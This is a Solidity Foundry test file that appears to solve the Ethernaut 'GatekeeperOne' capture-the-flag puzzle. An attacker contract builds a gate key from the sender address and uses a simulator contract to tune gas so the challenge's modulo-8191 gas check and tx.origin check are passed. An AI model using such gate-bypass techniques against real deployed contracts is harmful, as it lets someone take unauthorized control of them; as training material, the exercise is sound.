// SPDX-License-Identifier: MIT

pragma solidity 0.8.21;
import "forge-std/Test.sol";
import "forge-std/console.sol";

contract TestBypasser is Test {
    GatekeeperOne keeper;
    GateKeeperByPass pass;
    GateSimulator simulator;
    function setUp() public {
        keeper = new GatekeeperOne();
        simulator = new GateSimulator();
        pass = new GateKeeperByPass(keeper, simulator);
    }

    function testByPass() public {
        vm.prank(address(399));
        pass.bypass{gas: 3 * 8191}();
    }

    function testCompl() public pure {
        uint64 value = uint64(
            bytes8(
                keccak256(
                    abi.encodePacked(0x38C5479620f6C2f29677F04d89E356cF6E75CFde)
                )
            )
        );
        uint64 cmp = uint64(~bytes8(value));
        uint64 max = value ^ cmp;
        console.log("VAL CMP MAX", value, cmp, max);
    }
}

contract GateKeeperByPass {
    GatekeeperOne private pass;
    GateSimulator simulator;
    constructor(GatekeeperOne _pass, GateSimulator _simulator) {
        pass = _pass;
        simulator = _simulator;
    }

    function bypass() public {
        bytes8 mask = bytes8(bytes4(type(uint32).max));
        bytes8 last = bytes8(uint64(uint16(uint160(msg.sender))));
        bytes8 key = mask | last;
        // uint256 snap = gasleft();
        // simulator.enter{gas: 8191}(key);
        (bool success, bytes memory data) = address(simulator).call{gas: 8191}(
            abi.encodeWithSignature("enter(bytes8)", key)
        );
        // console.log("Two: ", abi.decode(data, (uint256)));
        uint256 sim = 8191 - abi.decode(data, (uint256));
        // snap = gasleft();
        // (success, ) = address(pass).call{gas: 8191}(
        //     abi.encodeWithSignature("enter(bytes8)", key)
        // );
        // console.log("SG1: ", snap - gasleft());
        console.log("SG2: ", sim);
        require(success);
        pass.enter{gas: 8191 + /* 514 */ sim + 3}(key);
        console.log("entrat: ", pass.entrant());
    }
}
contract GateSimulator {
    address public entrant;
    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        _;
    }

    function enter(
        bytes8 /* _gateKey */
    ) public view gateOne gateTwo returns (uint256) {
        return gasleft();
    }
}

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 snap = gasleft();
        bool cmp = snap % 8191 == 0;
        console.log("G2: ", snap, cmp);
        require(cmp, "Required gas multitple of 8191");
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperOneSim {
    address public entrant;
    uint256 two;
    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        two = gasleft();
        require(gasleft() % 8191 >= 0);
        _;
    }

    function simulate() public gateOne gateTwo returns (uint256 gasUsed) {
        // Simulating up to the point where gateTwo would be reached
        return two; // Return the gas consumed so far
    }
}
